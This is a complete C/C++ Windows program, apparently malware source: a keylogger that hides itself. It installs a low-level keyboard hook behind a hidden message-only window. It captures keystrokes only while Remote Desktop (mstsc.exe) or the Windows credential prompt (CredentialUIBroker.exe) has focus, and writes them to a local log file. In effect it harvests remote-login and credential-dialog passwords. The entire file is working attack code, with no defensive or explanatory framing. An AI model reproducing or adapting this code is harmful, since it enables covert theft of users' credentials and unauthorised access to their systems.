#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Function to log the output to a file
void LogToFile(const char* format, ...) {
    FILE* file;
    fopen_s(&file, "logfile.txt", "a"); // Open file in append mode

    if (file != NULL) {
        va_list args;
        va_start(args, format);

        vfprintf(file, format, args); // Write formatted data to file

        va_end(args);
        fclose(file); // Close the file
    }
}

DWORD GetProcId(const wchar_t* procName) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnap, &pe32)) {
            do {
                if (!_wcsicmp(procName, pe32.szExeFile)) {
                    procId = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pe32));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

BOOL isWindowOfProcessFocused(const wchar_t* processName) {
    // Get the PID of the process
    DWORD pid = GetProcId(processName);
    if (pid == 0) {
        // Process not found :(
        return FALSE;
    }

    // Get handle to the active window
    HWND hActiveWindow = GetForegroundWindow();
    if (hActiveWindow == NULL) {
        // No active window found
        return FALSE;
    }

    // Get PID of the active window
    DWORD activePid;
    GetWindowThreadProcessId(hActiveWindow, &activePid);

    // Check if the active window belongs to the process we're interested in
    if (activePid != pid) {
        // Active window does not belong to the specified process
        return FALSE;
    }

    // If we've gotten this far, the active window belongs to our process
    return TRUE;
}

LRESULT CALLBACK KbdHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        static int prev;
        BOOL isLetter = TRUE;

        if (isWindowOfProcessFocused(L"mstsc.exe") || isWindowOfProcessFocused(L"CredentialUIBroker.exe")) {
            PKBDLLHOOKSTRUCT kbdStruct = (PKBDLLHOOKSTRUCT)lParam;
            int vkCode = kbdStruct->vkCode;

            if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
                BOOL shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                BOOL capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                switch (vkCode) {
                case VK_SHIFT:
                case VK_LSHIFT:
                case VK_RSHIFT:
                    isLetter = FALSE; // Skip logging Shift key
                    break;
                case VK_CAPITAL:
                    LogToFile("<CAPSLOCK>");
                    isLetter = FALSE;
                    break;
                case VK_RETURN:
                    LogToFile("\n");
                    isLetter = FALSE;
                    break;
                case VK_SPACE:
                    LogToFile(" ");
                    isLetter = FALSE;
                    break;
                case VK_TAB:
                    LogToFile("\t");
                    isLetter = FALSE;
                    break;
                case VK_BACK:
                    LogToFile("<BACKSPACE>");
                    isLetter = FALSE;
                    break;
                case VK_OEM_PERIOD:
                    if (shiftPressed) {
                        LogToFile(">");
                    }
                    else {
                        LogToFile(".");
                    }
                    isLetter = FALSE;
                    break;
                default:
                    break;
                }

                if (isLetter) {
                    BYTE keyState[256];
                    GetKeyboardState(keyState);
                    WORD translatedKey[2];
                    if (ToAscii(vkCode, kbdStruct->scanCode, keyState, translatedKey, 0)) {
                        char pressedKey = static_cast<char>(translatedKey[0]);
                        LogToFile("%c", pressedKey);
                    }
                }

                prev = vkCode;
            }
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HHOOK kbdHook = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHookProc, hInstance, 0);
    if (kbdHook == NULL) {
        // Hook installation failed
        return 1;
    }

    // Create a hidden window
    WNDCLASSEX wndClass = { 0 };
    wndClass.cbSize = sizeof(WNDCLASSEX);
    wndClass.lpszClassName = L"HiddenWindowClass";
    wndClass.lpfnWndProc = DefWindowProc;
    RegisterClassEx(&wndClass);

    HWND hWnd = CreateWindowEx(
        0,
        L"HiddenWindowClass",
        L"Hidden Window",
        0,
        0, 0, 0, 0,
        HWND_MESSAGE,
        NULL,
        hInstance,
        NULL
    );

    if (hWnd == NULL) {
        // Failed to create hidden window
        UnhookWindowsHookEx(kbdHook);
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(kbdHook);

    return 0;
}
